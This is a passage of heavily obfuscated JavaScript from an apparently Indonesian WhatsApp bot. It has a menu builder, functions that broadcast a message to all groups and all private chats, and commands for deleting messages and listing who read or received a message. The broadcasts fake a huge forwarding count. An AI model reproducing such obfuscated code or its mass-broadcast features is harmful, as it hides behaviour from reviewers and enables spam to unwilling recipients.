_0x17d51e={};_0x17d51e[_0x15af3d(0x655,0x69c,0xb0e,0x1e7)]=_0x134458(0x4ff,0x133,0x65a,0xa6),_0x17d51e[_0x15af3d(0xbe0,0xc56,0xf30,0xa43)+'n']=_0x15af3d(0x397,0x50,0x218,0x2a3)+'is\x20if\x20you\x20'+'want\x20to\x20us'+'e\x20the\x20soun'+_0x134458(0x6cc,0x493,0x2ad,0x536)+_0x15af3d(0x932,0x77c,0x6e3,0xdb2),_0x17d51e[_0x15af3d(0x333,-0xa9,0x1d5,0x5cb)]='0';const _0x257639={};_0x257639[_0x134458(0x502,0x1f8,0x3e6,0x26)]=_0x134458(0xb09,0x75d,0xb9d,0xf9b)+_0x134458(0x1ce,0x2b2,-0x30b,-0x8b),_0x257639[_0x134458(0xa4e,0x593,0x988,0xe84)]=[_0x17d51e];const _0x354d6b={};_0x354d6b[_0x15af3d(0x655,0x8bc,0x467,0x6d2)]=_0x134458(0x99b,0x5c5,0x5d9,0x79b)+'e',_0x354d6b[_0x15af3d(0xbe0,0x9bb,0xe3a,0x8a4)+'n']=_0x134458(0x8c5,0x66a,0x404,0x4e7)+_0x15af3d(0x39f,0x1d7,0x70f,-0x14)+'u\x20want\x20to\x20'+_0x15af3d(0x7e6,0x696,0xbae,0xa9b)+_0x15af3d(0x98a,0x49d,0xb93,0xe6f)+_0x15af3d(0x737,0x271,0xb72,0x4de),_0x354d6b[_0x134458(0x1e0,0xb8,0x676,0x7d)]=_0x15af3d(0xaee,0xd99,0xd81,0xda7)+'e';const _0x149817={};_0x149817[_0x15af3d(0x655,0x68e,0x8eb,0x1a1)]=_0x15af3d(0x407,0x559,0xfd,0x87d)+_0x15af3d(0x676,0xa0a,0x436,0x206),_0x149817[_0x134458(0xa4e,0x7df,0x59e,0xa06)]=[_0x354d6b];const _0x15d51d={};_0x15d51d['title']=_0x15af3d(0x629,0x97d,0x620,0x231)+'\x20to',_0x15d51d['descriptio'+'n']=_0x134458(0x8c5,0xcfb,0x4f2,0x987)+_0x15af3d(0x39f,0x7a6,0x589,0x1e2)+_0x134458(0xaca,0xca1,0x716,0x7b6)+_0x134458(0x895,0x48a,0xbe5,0x72d)+_0x134458(0x81d,0x903,0x6d3,0xb9a)+'ributed\x20to'+_0x15af3d(0xade,0xd2a,0x88a,0x775)+_0x15af3d(0xb44,0xf63,0x67f,0x8f7),_0x15d51d[_0x15af3d(0x333,0x250,0x4e5,0x10)]='0';const _0x78cf13={};_0x78cf13['title']=_0x15af3d(0xb67,0x7a9,0x73d,0x8ab)+_0x134458(0x382,-0x95,0x371,0x150),_0x78cf13[_0x134458(0xa4e,0xc0a,0x5c6,0xd9d)]=[_0x15d51d];let pip=alpha['prepareMes'+_0x15af3d(0xc48,0xd52,0xcae,0x10f7)+_0x15af3d(0x543,0x707,0x629,0x8c)](from,{'listMessage':{'title':'LIST\x20MENU\x20'+_0x15af3d(0x7eb,0xa0f,0x649,0x7dd),'description':_0x15af3d(0xb9c,0x83b,0x883,0xd74)+sender[_0x15af3d(0x53f,0xe9,0x60f,0x97a)]('@')[-0x204+-0xa2*-0x1d+-0x1056]+(_0x15af3d(0x489,0x453,-0x28,0x65b)+_0x15af3d(0x761,0xb2e,0xc3a,0xa9e)+'nangkan\x20😇,'+_0x15af3d(0x587,0x1c3,0x504,0x552)+_0x15af3d(0x3aa,0x84,0x769,0xe1)+_0x15af3d(0x69e,0x61f,0xa5e,0x91c)+'hkan\x20dipil'+_0x15af3d(0xc65,0xb59,0xe89,0xcd3)+_0x15af3d(0x385,0x77f,0x67d,0x774)),'buttonText':_0x15af3d(0x579,0x823,0x160,0x1b1)+'E','footerText':''+creator,'listType':_0x15af3d(0x9c0,0xaa0,0xaa8,0x686)+'ECT','sections':[_0x16c66f,_0x532fd3,_0x20b2b2,_0x53f2a7,_0x47a90f,_0x3881ad,_0x4ee86f,_0x1f3fd0,_0xf9bd99,_0xb4c2bb,_0x241277,_0x10f39b,_0x182ccc,_0x4efc1c,_0x4ae5b4,_0x24bdf9,_0xb80ff1,_0x2fd952,_0x4f76bf,_0x10aae7,_0xad861a,_0x257639,_0x149817,_0x78cf13]}},{'quoted':fgclink2,'contextInfo':{'mentionedJid':[sender]}});const _0x53de7d={};_0x53de7d[_0x15af3d(0x6c4,0x9ec,0x9f7,0xb29)]=!![],alpha[_0x134458(0x243,0x1fd,0x4c6,0x4aa)+_0x134458(0x9a3,0xe6f,0x77e,0x9d9)](pip,_0x53de7d);}const ini_bc_gc_bang=_0x1b5a0c=>{const _0x41445c={};function _0x190804(_0x576534,_0x4ece6c,_0x3301bc,_0xa58ea4){return _0x15af3d(_0x576534- -0x3a9,_0x4ece6c-0x9a,_0xa58ea4,_0xa58ea4-0x1a);}_0x41445c[_0x190804(0x286,0x44a,0x2b8,-0x1d3)]=_0x190804(-0x29,-0x33e,0x93,0x5e),_0x41445c['DYKGf']=_0x5540bc(0x36c,0x776,0x7b1,0x574),_0x41445c[_0x5540bc(0x2d9,0x4fd,0x73d,0x262)]=_0x5540bc(0xae4,0x97f,0x632,0x2db)+_0x190804(0x29c,0x2cb,0xf8,0x40a),_0x41445c[_0x190804(-0x109,-0x3ee,0x37f,0x184)]=_0x5540bc(0xc6,0x27d,0x479,0x317),_0x41445c['sXBUP']=_0x5540bc(0xe32,0x5e7,0x957,0xb03),_0x41445c['BexnO']=_0x190804(0x7fe,0x6ad,0x4c1,0x938),_0x41445c[_0x5540bc(0x959,0xa7b,0x665,0x425)]=_0x190804(-0xcc,-0xd1,-0x13b,0x12e),_0x41445c[_0x190804(-0x9,-0x43c,0x1e4,-0x21c)]='sewa_kak',_0x41445c[_0x190804(-0x48,0x215,-0x478,0x2e5)]=_0x5540bc(0x7cd,0x5d9,0x434,0x632)+'21';const _0x146be7=_0x41445c;var _0x53c365=alpha[_0x5540bc(0x31e,0x28d,0x650,0x994)][_0x5540bc(0xccf,0x4a4,0x80e,0x6be)]()[_0x5540bc(0x508,0x287,0x48f,-0x6)](_0x177b31=>_0x177b31[_0x190804(0xa,-0x32f,0xd0,0x300)][_0x5540bc(0x7d9,0x53a,0x85c,0x905)](_0x190804(0x5f0,0x71e,0x8f2,0xae3)));function _0x5540bc(_0x3040bb,_0x47af70,_0x245ca6,_0x143014){return _0x15af3d(_0x245ca6- -0x209,_0x47af70-0x198,_0x3040bb,_0x143014-0x19f);}let _0x448d7d=_0x1b5a0c;for(let _0x33bfa9 of _0x53c365){if(_0x146be7[_0x190804(-0x109,0x19d,0x82,-0x5c3)]===_0x146be7[_0x190804(0xc2,0x93,0x126,-0x12c)]){if(_0x5e4aef===![])return;const _0x58b165={};_0x58b165[_0x190804(0x343,0x15f,0x4fe,0x64a)+'t']=_0x146be7['fESOK'];const _0x32a312={};_0x32a312[_0x190804(0x88a,0x668,0x458,0xc12)]=_0x190804(0x4ce,0x5f7,0x755,0x576),_0x32a312[_0x190804(0x1fe,0x3b0,-0x2da,0x6ae)]=_0x58b165,_0x32a312[_0x5540bc(0x373,0xb62,0x849,0xc28)]=_0x146be7[_0x190804(0x2a2,0x6ad,0x659,0x10e)];const _0x13427c={};_0x13427c['displayTex'+'t']=_0x146be7[_0x5540bc(0x975,0x490,0x73d,0xae2)];const _0x50cba0={};_0x50cba0['buttonId']=_0x5540bc(0x666,0x4a5,0x890,0x490)+'ff',_0x50cba0['buttonText']=_0x13427c,_0x50cba0['type']=_0x146be7[_0x5540bc(0x507,0x3d4,0x442,0x428)];let _0x35fac7=[_0x32a312,_0x50cba0];const _0x16b671={};_0x16b671[_0x5540bc(0x27a,0x363,0x34d,0x764)+'id']=[_0x4f81d2];const _0x3448d3={};_0x3448d3[_0x190804(0x885,0xa77,0x442,0x6fd)]=_0x3c9708,_0x3448d3[_0x5540bc(0xad0,0xce8,0x8b2,0xc7d)+'o']=_0x16b671;if(_0x4ba1a3&&!_0x52566c[_0x190804(0x191,0x58b,0x58,0x4c)][_0x5540bc(-0x3ff,-0x5e,0xcf,-0x4d)]&&!_0x39fd3b&&!_0x53f6fd&&!_0x386d14)return _0x3a8421(_0x3a27c2,_0x190804(0x258,0x5bf,0x657,0x2df)+_0x2fe7ce[_0x5540bc(0x378,0x647,0x336,0x769)]('@')[0x2034+0x2177+0x1*-0x41ab]+(_0x5540bc(0x922,0x8a5,0x8ab,0xcae)+_0x5540bc(0x105,0x249,0x563,0x659)+_0x190804(0x5b3,0x23d,0x1a7,0x55e)+'\x20database.'+_0x190804(0x3c2,0x229,0x1aa,0x488)+'verifikasi'+_0x190804(0x3f9,0x895,-0xa6,0x259)+_0x5540bc(0x776,-0x82,0x2b9,-0x162)+'dahulu\x20den'+_0x5540bc(0xc7f,0x869,0xa17,0xb92)+'etik\x20@veri'+_0x5540bc(0x549,0x9f5,0x6c7,0x60c)+_0x190804(0x82e,0x7e2,0x468,0xd1a)+_0x190804(0x1ae,0x1e7,-0x223,-0x2b4)),_0x2e23f8+'™©\x20|\x20'+_0x4775ae,_0x35fac7,_0x3448d3);}else{const _0x20d18a={};_0x20d18a['buttonId']=_0x146be7[_0x190804(0x57b,0x13b,0x412,0x5b6)],_0x20d18a[_0x190804(0x1fe,-0x113,0x65d,-0xfb)]={},_0x20d18a[_0x5540bc(0xb82,0xb3e,0x849,0x943)]=0x1,_0x20d18a[_0x190804(0x1fe,-0x113,0x65d,-0xfb)][_0x5540bc(0x2e2,0x136,0x4e3,0x7e2)+'t']=_0x146be7['mEWmg'];const _0x3bbd7c={};_0x3bbd7c[_0x5540bc(0x30f,0x762,0x4e3,0x304)+'t']=_0x5540bc(0x9ee,0xa33,0x920,0x80c)+'a';const _0x774fac={};_0x774fac[_0x190804(0x88a,0x816,0x40d,0xcb7)]=_0x146be7[_0x5540bc(0x3ae,-0x31c,0x197,-0x29a)],_0x774fac[_0x5540bc(0x662,0x568,0x39e,0x47d)]=_0x3bbd7c,_0x774fac[_0x5540bc(0x41a,0x78f,0x849,0x549)]=0x1;var _0x165960=[_0x20d18a,_0x774fac];const _0x454dda={};_0x454dda[_0x190804(0x5a1,0x379,0x467,0x541)+'t']='*BROADCAST'+'*'+enter+enter+_0x448d7d,_0x454dda[_0x5540bc(0x6e1,0xbe5,0x8fc,0x912)]=''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator,_0x454dda[_0x5540bc(0x4fc,-0x232,0x26b,0x4c7)]=_0x165960,_0x454dda[_0x5540bc(0x328,-0x52,0x386,0x82c)]=0x1;var _0x536d19=_0x454dda;const _0x35a4be={};_0x35a4be['text']='hi',_0x35a4be[_0x5540bc(0x7a4,0x6ca,0x6e8,0x6ed)+_0x190804(0x85b,0xc5c,0xb24,0x813)]=0x3b9aca00,_0x35a4be[_0x190804(0x1df,0x4eb,0x4d8,0xe2)+'d']=!![],_0x35a4be['sendEpheme'+_0x190804(0x221,-0x1ac,0x672,-0x8f)]=!![];const _0x3a40df={};_0x3a40df[_0x190804(0x197,0x31a,0x362,0x5ea)]=_0x146be7[_0x5540bc(0x626,0xff,0x158,0x42e)],_0x3a40df[_0x5540bc(0xd00,0xc63,0x8b2,0x6e6)+'o']=_0x35a4be,_0x3a40df[_0x5540bc(0x6a4,0xc1b,0xa25,0x8d2)]=ftroli,_0x3a40df[_0x190804(0x281,0x453,0x153,0x2d)+_0x190804(0x221,0x377,0x624,-0xfa)]=!![],alpha[_0x190804(0x72c,0x747,0x9c2,0x34b)+'e'](_0x33bfa9[_0x5540bc(0x2ba,-0xbb,0x1aa,0x57f)],_0x536d19,MessageType[_0x5540bc(-0x329,-0x2c6,0x9b,-0xf6)+'sage'],_0x3a40df);}}},ini_bc_pc_bang=_0x142374=>{const _0x54e65a={};_0x54e65a[_0xc58357(0x8c6,0x5da,0x3b1,0x875)]=_0xc58357(0x3b3,0x87d,0xc8d,0x819);function _0xc58357(_0xddec13,_0x26605b,_0x255f07,_0x52b8f2){return _0x134458(_0x52b8f2- -0x23b,_0x26605b-0x12f,_0x255f07,_0x52b8f2-0xa8);}_0x54e65a[_0xc58357(-0x13a,-0x97,0x487,0x2ee)]=_0x46e28c(0x3d4,0x1fc,0xbb,0x3c2),_0x54e65a[_0x46e28c(0x691,0x9e6,0x95f,0x7d2)]=_0xc58357(0x877,0x2d0,0x147,0x58a),_0x54e65a[_0xc58357(0x64a,0x1ee,0x868,0x42e)]=_0xc58357(0x6f6,0x668,-0x71,0x320),_0x54e65a['GDnIg']=_0x46e28c(0x4c8,0xa74,0x9bf,0x722)+'21';function _0x46e28c(_0x493715,_0x4774d6,_0x458880,_0x3bceb7){return _0x15af3d(_0x3bceb7-0xe5,_0x4774d6-0x146,_0x493715,_0x3bceb7-0x159);}const _0x23cee9=_0x54e65a;var _0x41a0f1=alpha[_0xc58357(0x2f7,0xc9,0x25c,0x4cb)][_0x46e28c(0xb5a,0x708,0xddf,0xafc)]();let _0x397fd7=_0x142374;for(let _0x4ee5d9 of _0x41a0f1){const _0x42688f={};_0x42688f[_0xc58357(0x43a,0x976,0x3b3,0x8a5)]=_0x23cee9[_0x46e28c(0x7f3,0xac5,0xeb3,0xce8)],_0x42688f[_0xc58357(-0xb7,-0x2b,-0x158,0x219)]={},_0x42688f[_0x46e28c(0xa48,0xcc8,0xeb6,0xb37)]=0x1,_0x42688f[_0xc58357(-0xb7,-0x2b,-0x158,0x219)][_0x46e28c(0x533,0x794,0x934,0x7d1)+'t']=_0x23cee9['JEEHb'];const _0xbded40={};_0xbded40[_0xc58357(0x8d1,0x7e5,0xc4b,0x8a5)]=_0x23cee9['KDJLV'],_0xbded40[_0x46e28c(0xaf2,0x82e,0x772,0x68c)]={},_0xbded40[_0x46e28c(0xac8,0xf8d,0xf04,0xb37)]=0x1,_0xbded40[_0x46e28c(0xaf2,0x82e,0x772,0x68c)]['displayTex'+'t']=_0x23cee9[_0x46e28c(0xcc8,0x73d,0x93c,0x8a1)];var _0x5d351d=[_0x42688f,_0xbded40];const _0x104467={};_0x104467['contentTex'+'t']=_0x46e28c(0x612,0x427,0x5d4,0x57d)+'*'+enter+enter+_0x397fd7,_0x104467[_0xc58357(0x30d,0x434,0xc43,0x777)]=''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator,_0x104467[_0x46e28c(0x135,0x244,0x32f,0x559)]=_0x5d351d,_0x104467['headerType']=0x1;var _0xf7a0ef=_0x104467;const _0x5b9f33={};_0x5b9f33[_0xc58357(0x669,0x5a6,0x745,0x7e0)]='hi',_0x5b9f33[_0x46e28c(0x9c0,0xdb9,0xb57,0x9d6)+_0x46e28c(0x97d,0xd9e,0x11dd,0xce9)]=0x3b9aca00,_0x5b9f33['isForwarde'+'d']=!![],_0x5b9f33[_0x46e28c(0x9f6,0x9b9,0x66a,0x70f)+_0x46e28c(0x48e,0x9e3,0x1d6,0x6af)]=!![];const _0x339905={};_0x339905[_0xc58357(0x211,0x616,0x1c8,0x1b2)]=_0x23cee9['GDnIg'],_0x339905[_0x46e28c(0x81b,0x84f,0x8dc,0xba0)+'o']=_0x5b9f33,_0x339905[_0x46e28c(0xc0c,0x1153,0xe4b,0xd13)]=ftroli,_0x339905[_0x46e28c(0x515,0x543,0x2f0,0x70f)+'ral']=!![],alpha['sendMessag'+'e'](_0x4ee5d9[_0xc58357(0x227,0x187,0x4ba,0x25)],_0xf7a0ef,MessageType[_0xc58357(0x3c6,0x34d,-0x2ef,-0xea)+'sage'],_0x339905);}};switch(command){case'q':if(!mek[_0x15af3d(0x53a,0x893,0x203,0x346)][_0x134458(0x185,0x3d0,0xee,-0x2e0)]&&!isOwner&&!isCreator)return reply(lang[_0x15af3d(0x86a,0xa78,0x988,0x941)]());if(!m[_0x134458(0xadb,0xaec,0x783,0xd10)])return reply(_0x134458(0x8e6,0x775,0x692,0x8d3)+_0x134458(0x62c,0x52c,0x829,0x1ea));let qse=alpha[_0x15af3d(0x9ec,0xe4b,0x5dc,0xbf6)](await m[_0x134458(0x16c,0x1fa,0x1e3,0x3d6)+'bj']());if(!qse[_0x15af3d(0xc2e,0x7a1,0x1046,0x9bf)])return reply(_0x15af3d(0x55a,0x18b,0x93c,0x8c6)+'e\x20you\x20repl'+_0x134458(0x7e6,0xc9f,0xa5c,0x5d0)+_0x15af3d(0x5d7,0x18c,0x3fe,0x677)+'\x20a\x20reply!');await qse[_0x134458(0xadb,0xa50,0x85f,0x902)][_0x134458(0x6b2,0x40b,0xa4f,0x8e3)+'rd'](m['chat'],!![]);break;case'del':case _0x15af3d(0xa5f,0xbd4,0x761,0x5b2):case'd':try{if(!isQuotedMsg)return reply('Reply\x20pesa'+_0x15af3d(0x4c3,0xea,0x4a,0x8d8));const _0x3d5227={};_0x3d5227['id']=mek[_0x15af3d(0x7cc,0x550,0x32f,0x4d7)][_0x15af3d(0xac7,0xf31,0x9f2,0x6c9)+'xtMessage'][_0x134458(0x968,0x5f7,0xe05,0x588)+'o'][_0x134458(0x7f4,0x72b,0xb4e,0x747)],_0x3d5227[_0x15af3d(0x4b4,0x365,0x443,0x536)]=from,_0x3d5227[_0x15af3d(0x2d8,0x256,0x2ee,0x5ae)]=!![],pp=_0x3d5227;if(!isGroupAdmins&&!mek[_0x15af3d(0x53a,0x2dd,0x820,0x574)][_0x15af3d(0x2d8,0xf9,0x142,0x32b)]&&!isOwner&&!isCreator)return reply(mess[_0x134458(0x58a,0x308,0x736,0x277)][_0x134458(0x387,0x65b,0x8f,0x5b0)]);alpha['deleteMess'+_0x134458(0xa9c,0xd6d,0x656,0xe0c)](from,pp);}catch(_0x425f91){reply(_0x134458(0x67f,0x986,0x835,0x92d)+_0x15af3d(0xaa1,0xe01,0x6d6,0xbb8)),reply(_0x425f91),console[_0x15af3d(0xb9a,0x98c,0x705,0x805)](_0x425f91);}break;case _0x15af3d(0x7ba,0x5bb,0x4ec,0x370):const _0x341012={};_0x341012[_0x15af3d(0x6ec,0xb47,0x73d,0x5ee)+'t']=_0x15af3d(0x959,0x73c,0x710,0x892)+'t';const _0x2c7900={};_0x2c7900[_0x134458(0xae0,0xde6,0x7eb,0x5f9)]='limit',_0x2c7900[_0x134458(0x454,0x7fe,0xe6,-0x6)]=_0x341012,_0x2c7900['type']=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x134458(0x7fd,0xb75,0x399,0xc1a)](prefix),'©\x20'+ownername,[_0x2c7900]);try{if(!isGroup)return reply(_0x15af3d(0x958,0x53c,0xd1d,0xbf7)+_0x134458(0x16f,0x5ba,0x2c4,0x2fb)+_0x15af3d(0x2e9,0x4cd,0x41c,0x5c4));if(!isQuotedMsg)return reply(_0x134458(0x513,0x494,0x147,0x217)+_0x134458(0xa15,0xb0a,0xbe6,0x59a));infom=await alpha[_0x134458(0x29e,0x50f,0x5df,-0x40)+'o'](from,mek[_0x134458(0x679,0x894,0x823,0x4bd)]['extendedTe'+_0x134458(0xa11,0xd7f,0xace,0xb0f)][_0x134458(0x968,0xd9f,0xb32,0x543)+'o'][_0x134458(0x7f4,0xc2e,0x78c,0x848)]),hemm=infom[_0x134458(0x783,0xc6f,0x635,0xc31)],hemms=infom[_0x15af3d(0x961,0xb4d,0xa9a,0xb83)],readon=hemms[_0x15af3d(0xbe9,0x96a,0xf72,0xd5c)](_0x5bb752=>_0x5bb752[_0x134458(0x260,0x598,-0x1a1,0x704)]),readdin=hemm[_0x15af3d(0xbe9,0xbd0,0x872,0xed7)](_0x2b5038=>_0x2b5038[_0x134458(0x260,0x1bd,0x47d,0x35e)]),stamp=hemm[_0x15af3d(0xbe9,0x70c,0xadd,0xb1a)](_0x331581=>_0x331581['t']);function toTime(_0x53201d,_0x5c43d3){const _0x5a787d={};_0x5a787d[_0x1841ff(0x5aa,0x29a,-0x1ac,0x327)]='undefined',_0x5a787d['RHxWg']=function(_0x3ea2f7,_0x49abd7){return _0x3ea2f7*_0x49abd7;};function _0x2ff308(_0x7dcc0b,_0x141eed,_0x4dbe82,_0xff37e2){return _0x134458(_0x141eed-0x13a,_0x141eed-0x82,_0x4dbe82,_0xff37e2-0x134);}const _0xa96c25=_0x5a787d;_0x5c43d3=typeof _0x5c43d3==_0xa96c25[_0x2ff308(0x89,0x466,0x4fd,0xdb)]?![]:!![];let _0x2f2f77=new Date(_0x53201d);_0x5c43d3&&(_0x2f2f77=new Date(_0xa96c25[_0x1841ff(0x42f,0x275,0x8ad,0x5c8)](_0x53201d,-0x1*0x1d61+0x8e7+0x1862)));var _0x2b59d1=_0x2f2f77['getHours'](),_0x5e99e1=_0x2f2f77[_0x2ff308(0x393,0x58b,0x3d8,0x602)](),_0x2557be=_0x2f2f77[_0x1841ff(0x713,0xd0,0x112,0x591)](),_0x2ae2ff=_0x2b59d1+':'+_0x5e99e1+':'+_0x2557be;function _0x1841ff(_0x3a0763,_0x55eb5f,_0x2047d9,_0x2ed518){return _0x15af3d(_0x2ed518- -0x158,_0x55eb5f-0x41,_0x55eb5f,_0x2ed518-0x101);}return _0x2ae2ff;}function toBulan(_0x5f476f,_0x5d35bb){const _0x3d9eb0={};_0x3d9eb0['OLznP']=function(_0x1b6830,_0x466260){return _0x1b6830==_0x466260;},_0x3d9eb0[_0x4248c5(0x9f9,0xeff,0xaaa,0x672)]=_0x4248c5(0xd69,0xac6,0xb68,0xaa1),_0x3d9eb0['mlNfO']=function(_0x49dada,_0x43426b){return _0x49dada*_0x43426b;},_0x3d9eb0[_0x421305(-0x29c,0x125,0x556,0x1b8)]=_0x421305(0x25e,0x33d,0x569,0x1d7),_0x3d9eb0[_0x4248c5(0x707,0xedb,0xbc7,0x8c1)]='Maret',_0x3d9eb0[_0x421305(0x76f,0x5c1,0x169,0x651)]='April',_0x3d9eb0[_0x4248c5(0xba6,0xe47,0xc08,0xa1e)]=_0x421305(0xac8,0x7f0,0x8ce,0x3cc),_0x3d9eb0[_0x4248c5(0x46d,0xb2e,0x6b5,0x2c3)]=_0x421305(-0x242,-0x21,0x31e,0x2b2);function _0x421305(_0xbed628,_0x26c41d,_0x1e2b8f,_0x2c2748){return _0x15af3d(_0x26c41d- -0x46e,_0x26c41d-0x51,_0x1e2b8f,_0x2c2748-0xbc);}_0x3d9eb0[_0x4248c5(0x70f,0x80c,0x707,0x6b2)]=_0x421305(0x9fb,0x770,0x5cd,0x59f),_0x3d9eb0[_0x4248c5(0x4f1,0x471,0x64c,0x568)]=_0x421305(-0x458,-0x65,0x189,0x272),_0x3d9eb0[_0x4248c5(0x21f,0x4f2,0x65c,0x64f)]=_0x421305(-0x65a,-0x166,-0x4f1,-0x223),_0x3d9eb0[_0x421305(-0x251,0x25e,-0xc9,0x639)]=_0x4248c5(0x9ab,0xb48,0x7ba,0xa59),_0x3d9eb0[_0x421305(0x5d3,0x6bd,0x401,0x8e2)]=_0x4248c5(0xa0f,0x5a6,0x5dc,0x1e2),_0x3d9eb0[_0x4248c5(0x21c,-0x164,0x389,0x6f0)]=_0x4248c5(0xca7,0xa4c,0xb16,0xb80),_0x3d9eb0[_0x4248c5(0x875,0x1fd,0x60b,0x33d)]=_0x4248c5(0x9db,0x63e,0x598,0x6ee),_0x3d9eb0[_0x421305(0x6d2,0x27c,0x377,-0x205)]=_0x4248c5(0x8d5,0x6fb,0x8c0,0xc75),_0x3d9eb0[_0x421305(-0x131,0x295,0xe5,-0x1e0)]=_0x4248c5(0x2f1,0x63e,0x56a,0x333),_0x3d9eb0[_0x4248c5(0x709,0x2cd,0x4f6,0x4b3)]=function(_0x36712a,_0x5eeeac){return _0x36712a+_0x5eeeac;};const _0x1f8896=_0x3d9eb0;_0x5d35bb=_0x1f8896[_0x4248c5(0x225,0x7b6,0x572,0x72e)](typeof _0x5d35bb,_0x1f8896[_0x421305(0x14c,0x5d6,0x195,0xabc)])?![]:!![];let _0x5dae67=new Date(_0x5f476f);_0x5d35bb&&(_0x5dae67=new Date(_0x1f8896[_0x4248c5(0x7c3,0xd40,0xc27,0xf8a)](_0x5f476f,0x1*-0xced+0x13cb+-0x2f6)));var _0x2f7a3b=[_0x1f8896['RBkOR'],_0x4248c5(0x216,0x302,0x6bc,0x7c5),_0x1f8896[_0x421305(0x755,0x6f3,0x3d8,0x5f6)],_0x1f8896[_0x421305(0x4fe,0x5c1,0x92d,0x374)],_0x4248c5(0xb5a,0x53b,0x779,0x826),_0x1f8896[_0x421305(0x848,0x734,0xac1,0x54c)],_0x1f8896[_0x421305(0x4bb,0x1e1,0x1f5,0x26e)],_0x1f8896[_0x421305(0x1bc,0x233,0x3c1,0x5da)],_0x4248c5(0x61d,0x855,0x74b,0x81a),_0x1f8896['mGzHW'],'Nopember',_0x1f8896['AKTsm']],_0x3c4b88=[_0x1f8896[_0x4248c5(0x77d,0x9ef,0x732,0x64c)],_0x1f8896[_0x4248c5(0xec4,0x788,0xb91,0x981)],_0x1f8896[_0x4248c5(0x738,0x2e8,0x389,0x404)],'Rabu',_0x1f8896[_0x421305(0x1ac,0x137,-0x39,-0x226)],_0x1f8896[_0x4248c5(0x65e,0x782,0x750,0x273)],_0x1f8896[_0x4248c5(0x557,0xa72,0x769,0x962)]],_0x41e663=_0x5dae67[_0x4248c5(0x1ae,0x3a8,0x511,0x7bb)]();bulanee=_0x5dae67[_0x421305(0x476,0x3ce,0x319,0x5bf)]();var _0x256d98=_0x5dae67[_0x421305(-0x43f,-0x1c9,-0x297,-0x5e6)](),_0x256d98=_0x3c4b88[_0x256d98],_0x4b4057=_0x5dae67[_0x4248c5(0x620,0x6ab,0x968,0x67a)](),_0x1e1cb1=_0x4b4057<-0x114d*0x1+-0x5af+0x1*0x1ae4?_0x1f8896['UlOCz'](_0x4b4057,-0x1ed7+0x2381+-0x2c2*-0x1):_0x4b4057,_0x1a37e6=_0x256d98+',\x20'+_0x41e663+'\x20-\x20'+_0x2f7a3b[bulanee]+_0x421305(0x2c0,0x2cd,0x3b7,0x363)+_0x1e1cb1;function _0x4248c5(_0x5bac7b,_0x12eb91,_0x2cf589,_0x22e5a8){return _0x134458(_0x2cf589-0x1b9,_0x12eb91-0x160,_0x12eb91,_0x22e5a8-0x148);}return _0x1a37e6;}teksx=_0x15af3d(0x860,0x4bd,0xa94,0x52e)+enter;for(let i of hemm){teksx+=_0x15af3d(0x36e,0x7f5,0x3be,0x223)+i[_0x15af3d(0x3b3,0x7a4,0x1ad,0x6ce)]['split']('@')[0x1d*-0x85+-0x2636+0x3547]+enter+_0x15af3d(0x745,0x993,0xc23,0x39e)+toTime(i['t'],!![])+enter+(_0x15af3d(0x6d9,0xb42,0x219,0xb0f)+':\x20')+toBulan(i['t'],!![])+enter+'•'+enter;}teksx1='\x20*DELIVERE'+'D*'+enter+enter;for(let i of hemms){teksx1+=_0x15af3d(0x36e,0x1bc,0x380,0x3b5)+i[_0x15af3d(0x3b3,0x290,0x375,0x2e9)][_0x134458(0x3ec,-0xf,0x1a0,0x4a6)]('@')[-0xb64+-0x1912+0x2476]+enter,teksx1+=_0x134458(0x5f2,0x275,0x1b0,0x7b1)+toTime(i['t'],!![])+enter+(_0x15af3d(0x6d9,0x7ca,0x20e,0xa1a)+':\x20')+toBulan(i['t'],!![])+enter+'•'+enter;}const _0x580b42={};_0x580b42[_0x15af3d(0x8f1,0xd5f,0xb1b,0xac2)+_0x134458(0xab1,0x95e,0xe29,0xd73)]=0x3e7,_0x580b42[_0x134458(0x435,0x4b4,0x52b,0x5b7)+'d']=!![],_0x580b42[_0x134458(0x403,-0x64,0x851,0x6fa)+'id']=readdin,alpha[_0x15af3d(0xad5,0xde8,0x7a4,0xf22)+'e'](from,teksx,text,{'sendEphemeral':!![],'quoted':mek,'thumbnail':fs['readFileSy'+'nc'](_0x134458(0x295,-0x1ce,0x4d6,0x3b5)+thumbnail),'contextInfo':_0x580b42});const _0x14346d={};_0x14346d[_0x134458(0x79e,0x591,0x630,0x4a3)+_0x134458(0xab1,0x655,0x7d1,0xb14)]=0x3e7,_0x14346d['isForwarde'+'d']=!![],_0x14346d[_0x15af3d(0x556,0x8ab,0x7f5,0x3e0)+'id']=readon,alpha[_0x15af3d(0xad5,0xc0a,0x810,0xf0c)+'e'](from,teksx1,text,{'sendEphemeral':!![],'quoted':mek,'thumbnail':fs[_0x134458(0x526,0x45c,0x43e,0x9a3)+'nc'](_0x15af3d(0x3e8,0x848,0x103,-0xe0)+thumbnail),'contextInfo':_0x14346d});}catch(_0x12fa4a){reply(_0x134458(0x67f,0x8a4,0x4ea,0x192)+_0x15af3d(0xaa1,0xeaa,0xaca,0xc0a)),reply(_0x12fa4a),console[_0x134458(0xa47,0x940,0xb8b,0x72c)](_0x12fa4a);}await limitAdd(sender,limit);break;case'katailham':const _0xe5f78a={};_0xe5f78a[_0x15af3d(0x6ec,0x2b5,0x727,0xb39)+'t']=_0x134458(0x806,0x4d2,0x4c7,0x9fc)+'t';const _0x3dd12a={};_0x3dd12a[_0x134458(0xae0,0xd17,0xaf9,0xe47)]=_0x15af3d(0x950,0xc82,0x6a2,0x5b3),_0x3dd12a[_0x15af3d(0x5a7,0x41a,0x222,0x459)]=_0xe5f78a,_0x3dd12a['type']=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x15af3d(0x950,0x98d,0x581,0xdac)](prefix),'©\x20'+ownername,[_0x3dd12a]);const 